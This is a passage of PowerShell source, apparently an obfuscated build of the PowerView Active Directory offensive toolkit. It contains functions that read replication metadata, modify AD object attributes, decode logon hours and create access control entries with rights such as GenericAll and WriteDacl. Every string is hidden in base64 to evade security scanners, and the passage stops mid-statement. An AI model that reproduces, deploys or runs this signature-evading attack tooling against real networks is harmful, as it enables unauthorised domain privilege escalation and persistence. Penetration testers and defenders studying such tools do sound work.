    BEGIN {
        ${ea43c787582f45539b7f519da4680c7a} = @
{
            'Properties'    =   
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            
'Raw'           =   $True
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
   
         ${2a9e3fd98d53462a8a6c61a7aa3c4690} = $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] -Join '|'
        }
        else 
{
            ${2a9e3fd98d53462a8a6c61a7aa3c4690} = ''
        }
    }
  
  PROCESS {
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        Get-
DomainObject @ea43c787582f45539b7f519da4680c7a | ForEach-Object {
    
        ${77ca87db65af46af91551f70812dbd42} = $_.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
           
 ForEach(${29cab85d1ee44f039de259a44977e71b} in $_.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA=')))]) 
{
                ${7cfbc7ec307942fab976714e4e1c9453} = 
[xml]${29cab85d1ee44f039de259a44977e71b} | Select-Object -
ExpandProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RABTAF8AUgBFAFAATABfAFYAQQBMAFUARQBfAE0ARQBUAEEAXwBEAEEAVABBAA==')
)) -ErrorAction SilentlyContinue
                if 
(${7cfbc7ec307942fab976714e4e1c9453}) {
                    if 
(${7cfbc7ec307942fab976714e4e1c9453}.pszAttributeName -Match 
${2a9e3fd98d53462a8a6c61a7aa3c4690}) {
                        
${5cfffc0ad0f94214bae0585e8079600f} = New-Object PSObject
            
            ${5cfffc0ad0f94214bae0585e8079600f} | Add-Member 
NoteProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) 
${77ca87db65af46af91551f70812dbd42}
                        
${5cfffc0ad0f94214bae0585e8079600f} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQB0AHQAcgBpAGIAdQB0AGUATgBhAG0AZQA='))) 
${7cfbc7ec307942fab976714e4e1c9453}.pszAttributeName
                 
       ${5cfffc0ad0f94214bae0585e8079600f} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQB0AHQAcgBpAGIAdQB0AGUAVgBhAGwAdQBlAA=='))) 
${7cfbc7ec307942fab976714e4e1c9453}.pszObjectDn
                      
  ${5cfffc0ad0f94214bae0585e8079600f} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABpAG0AZQBDAHIAZQBhAHQAZQBkAA=='))) 
${7cfbc7ec307942fab976714e4e1c9453}.ftimeCreated
                     
   ${5cfffc0ad0f94214bae0585e8079600f} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABpAG0AZQBEAGUAbABlAHQAZQBkAA=='))) 
${7cfbc7ec307942fab976714e4e1c9453}.ftimeDeleted
                     
   ${5cfffc0ad0f94214bae0585e8079600f} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) 
${7cfbc7ec307942fab976714e4e1c9453}.ftimeLastOriginatingChange
       
                 ${5cfffc0ad0f94214bae0585e8079600f} | Add-Member 
NoteProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 
${7cfbc7ec307942fab976714e4e1c9453}.dwVersion
                        
${5cfffc0ad0f94214bae0585e8079600f} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) 
${7cfbc7ec307942fab976714e4e1c9453}.pszLastOriginatingDsaDN
          
              
${5cfffc0ad0f94214bae0585e8079600f}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQATABpAG4AawBlAGQAQQ
B0AHQAcgBpAGIAdQB0AGUASABpAHMAdABvAHIAeQA='))))
                      
  ${5cfffc0ad0f94214bae0585e8079600f}
                    }
           
     }
                else {
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEwAaQBuAGsAZQBkAEEAdA
B0AHIAaQBiAHUAdABlAEgAaQBzAHQAbwByAHkAXQAgAEUAcgByAG8AcgAgAHIAZQB0AH
IAaQBlAHYAaQBuAGcAIAAnAG0AcwBkAHMALQByAGUAcABsAHYAYQBsAHUAZQBtAGUAdA
BhAGQAYQB0AGEAJwAgAGYAbwByACAAJwAkAHsANwA3AGMAYQA4ADcAZABiADYANQBhAG
YANAA2AGEAZgA5ADEANQA1ADEAZgA3ADAAOAAxADIAZABiAGQANAAyAH0AJwA=')))
   
             }
            }
        }
    }
}
function Set-DomainObject 
{
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseShouldProcessForStateChangingFunctions', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        
[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = 
$True, ValueFromPipelineByPropertyName = $True)]
        [Alias
('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
   
     $Identity,
        [ValidateNotNullOrEmpty()]
        [Alias
('Replace')]
        [Hashtable]
        $Set,
        
[ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,
        
[ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,
        
[ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        
[ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
  
      $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias
('ADSPath')]
        [String]
        $SearchBase,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [Switch]
        $Tombstone,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${ea43c787582f45539b7f519da4680c7a} = @{'Raw' = $True}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS 
{
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        
${c01497bafce6425daf8f6db24c0f2c92} = Get-DomainObject 
@ea43c787582f45539b7f519da4680c7a
        ForEach ($Object in 
${c01497bafce6425daf8f6db24c0f2c92}) {
            
${325030b50e5d4e96be02a5e3ef70a9a8} = 
${c01497bafce6425daf8f6db24c0f2c92}.GetDirectoryEntry()
            
if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHQA')))]) {
                try {
  
                  $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHQA')))].GetEnumerator() | ForEach-Object {
                   
     Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to 
'$($_.Value)' for object 
'$(${c01497bafce6425daf8f6db24c0f2c92}.Properties.samaccountname)'"
  
                      ${325030b50e5d4e96be02a5e3ef70a9a8}.put
($_.Name, $_.Value)
                    }
                    
${325030b50e5d4e96be02a5e3ef70a9a8}.commitchanges()
                
}
                catch {
                    Write-Warning "[Set-
DomainObject] Error setting/replacing properties for object 
'$(${c01497bafce6425daf8f6db24c0f2c92}.Properties.samaccountname)' : 
$_"
                }
            }
            if($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WABPAFIA')))]) {
                try {
                    
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('WABPAFIA')))].GetEnumerator() | 
ForEach-Object {
                        
${3832cb125aa24c1b8394a4156fd2b65b} = $_.Name
                        
${c2f1c2fbc02f4996b180f846f5384186} = $_.Value
                       
 Write-Verbose "[Set-DomainObject] XORing 
'${3832cb125aa24c1b8394a4156fd2b65b}' with 
'${c2f1c2fbc02f4996b180f846f5384186}' for object 
'$(${c01497bafce6425daf8f6db24c0f2c92}.Properties.samaccountname)'"
  
                      ${ad06857678a24d188c2a45c4ac68c9d4} = 
${325030b50e5d4e96be02a5e3ef70a9a8}.
${3832cb125aa24c1b8394a4156fd2b65b}[0].GetType().name
                
        ${930d25db9cbd4d9aacb4898360447440} = 
$(${325030b50e5d4e96be02a5e3ef70a9a8}.
${3832cb125aa24c1b8394a4156fd2b65b}) -bxor 
${c2f1c2fbc02f4996b180f846f5384186}
                        
${325030b50e5d4e96be02a5e3ef70a9a8}.
${3832cb125aa24c1b8394a4156fd2b65b} = 
${930d25db9cbd4d9aacb4898360447440} -as 
${ad06857678a24d188c2a45c4ac68c9d4}
                    }
             
       ${325030b50e5d4e96be02a5e3ef70a9a8}.commitchanges()
           
     }
                catch {
                    Write-Warning 
"[Set-DomainObject] Error XOR'ing properties for object 
'$(${c01497bafce6425daf8f6db24c0f2c92}.Properties.samaccountname)' : 
$_"
                }
            }
            if($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBsAGUAYQByAA==')))]) {
                try {
                    
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBsAGUAYQByAA==')))] | ForEach-Object 
{
                        ${3832cb125aa24c1b8394a4156fd2b65b} = $_
    
                    Write-Verbose "[Set-DomainObject] Clearing 
'${3832cb125aa24c1b8394a4156fd2b65b}' for object 
'$(${c01497bafce6425daf8f6db24c0f2c92}.Properties.samaccountname)'"
  
                      ${325030b50e5d4e96be02a5e3ef70a9a8}.
${3832cb125aa24c1b8394a4156fd2b65b}.clear()
                    }
     
               ${325030b50e5d4e96be02a5e3ef70a9a8}.commitchanges()
   
             }
                catch {
                    Write-
Warning "[Set-DomainObject] Error clearing properties for object 
'$(${c01497bafce6425daf8f6db24c0f2c92}.Properties.samaccountname)' : 
$_"
                }
            }
        }
    }
}
function 
ConvertFrom-LDAPLogonHours {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseDeclaredVarsMoreThanAssignments', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    
[CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = 
$True, ValueFromPipelineByPropertyName = $True)]
        
[ValidateNotNullOrEmpty()]
        [byte[]]
        $LogonHoursArray
   
 )
    Begin {
        if($LogonHoursArray.Count -ne 21) {
            
throw $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('TABvAGcAbwBuAEgAbwB1AHIAcwBBAHIAcgBhAHkAIABpAHMAIAB0AGgAZQAgAGkAbg
BjAG8AcgByAGUAYwB0ACAAbABlAG4AZwB0AGgA')))
        }
        function 
ConvertTo-LogonHoursArray {
            Param (
                [int
[]]
                $HoursArr
            )
            
${34d9afb45e0d4dcfab0b84957f0338fc} = New-Object bool[] 24
           
 for(${9e5bb180fda8451b8ec7f5d4ed0667a4}=0; 
${9e5bb180fda8451b8ec7f5d4ed0667a4} -lt 3; 
${9e5bb180fda8451b8ec7f5d4ed0667a4}++) {
                
${51849f755fe54b99bbfb1f013c65f83e} = $HoursArr
[${9e5bb180fda8451b8ec7f5d4ed0667a4}]
                $Offset = 
${9e5bb180fda8451b8ec7f5d4ed0667a4} * 8
                
${db84aba3487f4cb4b47f15f36fa76a9e} = [Convert]::ToString
(${51849f755fe54b99bbfb1f013c65f83e},2).PadLeft(8,'0')
               
 ${34d9afb45e0d4dcfab0b84957f0338fc}[$Offset+0] = [bool] 
[convert]::ToInt32([string]${db84aba3487f4cb4b47f15f36fa76a9e}[7])
   
             ${34d9afb45e0d4dcfab0b84957f0338fc}[$Offset+1] = [bool] 
[convert]::ToInt32([string]${db84aba3487f4cb4b47f15f36fa76a9e}[6])
   
             ${34d9afb45e0d4dcfab0b84957f0338fc}[$Offset+2] = [bool] 
[convert]::ToInt32([string]${db84aba3487f4cb4b47f15f36fa76a9e}[5])
   
             ${34d9afb45e0d4dcfab0b84957f0338fc}[$Offset+3] = [bool] 
[convert]::ToInt32([string]${db84aba3487f4cb4b47f15f36fa76a9e}[4])
   
             ${34d9afb45e0d4dcfab0b84957f0338fc}[$Offset+4] = [bool] 
[convert]::ToInt32([string]${db84aba3487f4cb4b47f15f36fa76a9e}[3])
   
             ${34d9afb45e0d4dcfab0b84957f0338fc}[$Offset+5] = [bool] 
[convert]::ToInt32([string]${db84aba3487f4cb4b47f15f36fa76a9e}[2])
   
             ${34d9afb45e0d4dcfab0b84957f0338fc}[$Offset+6] = [bool] 
[convert]::ToInt32([string]${db84aba3487f4cb4b47f15f36fa76a9e}[1])
   
             ${34d9afb45e0d4dcfab0b84957f0338fc}[$Offset+7] = [bool] 
[convert]::ToInt32([string]${db84aba3487f4cb4b47f15f36fa76a9e}[0])
   
         }
            ${34d9afb45e0d4dcfab0b84957f0338fc}
        }
   
 }
    Process {
        ${5cfffc0ad0f94214bae0585e8079600f} = @{
      
      Sunday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray
[0..2]
            Monday = ConvertTo-LogonHoursArray -HoursArr 
$LogonHoursArray[3..5]
            Tuesday = ConvertTo-
LogonHoursArray -HoursArr $LogonHoursArray[6..8]
            
Wednesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray
[9..11]
            Thurs = ConvertTo-LogonHoursArray -HoursArr 
$LogonHoursArray[12..14]
            Friday = ConvertTo-
LogonHoursArray -HoursArr $LogonHoursArray[15..17]
            
Saturday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray
[18..20]
        }
        ${5cfffc0ad0f94214bae0585e8079600f} = New-
Object PSObject -Property ${5cfffc0ad0f94214bae0585e8079600f}
        
${5cfffc0ad0f94214bae0585e8079600f}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBvAG4ASABvAHUAcgBzAA=='))))
      
  ${5cfffc0ad0f94214bae0585e8079600f}
    }
}
function New-
ADObjectAccessControlEntry {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseShouldProcessForStateChangingFunctions', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('System.Security.AccessControl.AuthorizationRule')]
    
[CmdletBinding()]
    Param (
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, 
Mandatory = $True)]
        [Alias('DistinguishedName', 
'SamAccountName', 'Name')]
        [String]
        
$PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        
[String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
  
      [Alias('DomainController')]
        [String]
        $Server,
    
    [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
     
   $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        
$Tombstone,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Parameter
(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 
'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','G
enericAll','GenericExecute','GenericRead','GenericWrite','ListChildr
en','ListObject','ReadControl','ReadProperty','Self','Synchronize','
WriteDacl','WriteOwner','WriteProperty')]
        $Right,
        
[Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
    
    [ValidateSet('Allow', 'Deny')]
        [String[]]
        
$AccessControlType,
        [Parameter(Mandatory = $True, 
ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 
'Failure')]
        [String]
        $AuditFlag,
        [Parameter
(Mandatory = $False, ParameterSetName='AccessRuleType')]
        
[Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
    
    [Parameter(Mandatory = $False, 
ParameterSetName='ObjectGuidLookup')]
        [Guid]
        
$ObjectType,
        [ValidateSet('All', 
'Children','Descendents','None','SelfAndChildren')]
        [String]
  
      $InheritanceType,
        [Guid]
        $InheritedObjectType
    
)
    Begin {
        if ($PrincipalIdentity -notmatch 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBTAC0AMQAtAC4AKgA=')))) {
            
${787ec3d44efc4a30a68ac607b7c2216b} = @{
                'Identity' = 
$PrincipalIdentity
                'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcw
BpAGQA')))
            }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) 
{ ${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
          if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            
${6f274b64bae44d258a71c342e9849d59} = Get-DomainObject 
@787ec3d44efc4a30a68ac607b7c2216b
            if (-not 
${6f274b64bae44d258a71c342e9849d59}) {
                throw 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcA
BhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
   
         }
            elseif
(${6f274b64bae44d258a71c342e9849d59}.Count -gt 1) {
                
throw $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5ACAAbQBhAHQAYwBoAGUAcw
AgAG0AdQBsAHQAaQBwAGwAZQAgAEEARAAgAG8AYgBqAGUAYwB0AHMALAAgAGIAdQB0AC
AAbwBuAGwAeQAgAG8AbgBlACAAaQBzACAAYQBsAGwAbwB3AGUAZAA=')))
           
 }
            $ObjectSid = 
${6f274b64bae44d258a71c342e9849d59}.objectsid
        }
        else 
{
            $ObjectSid = $PrincipalIdentity
        }
        
${a00882beeb4041e19e9a5758b4bc37a1} = 0
        foreach
(${f6123aa7ea85434da1f9363f8fd23184} in $Right) {
            
${a00882beeb4041e19e9a5758b4bc37a1} = 
${a00882beeb4041e19e9a5758b4bc37a1} -bor 
(([System.DirectoryServices.ActiveDirectoryRights]${f6123aa7ea85434d
a1f9363f8fd23184}).value__)
        }
        
${a00882beeb4041e19e9a5758b4bc37a1} = 
[System.DirectoryServices.ActiveDirectoryRights]${a00882beeb4041e19e
9a5758b4bc37a1}
        $Identity = 
[System.Security.Principal.IdentityReference] 
([System.Security.Principal.SecurityIdentifier]$ObjectSid)
    }
    
Process {
        if($PSCmdlet.ParameterSetName -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQB1AGQAaQB0AFIAdQBsAGUAVAB5AHAAZQA=')))) {
            if
($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -
and $InheritedObjectType -eq $null) {
                New-Object 
System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList 
$Identity, ${a00882beeb4041e19e9a5758b4bc37a1}, $AuditFlag
           
 } elseif($ObjectType -eq $null -and $InheritanceType -ne 
[String]::Empty -and $InheritedObjectType -eq $null) {
               
 New-Object System.DirectoryServices.ActiveDirectoryAuditRule -
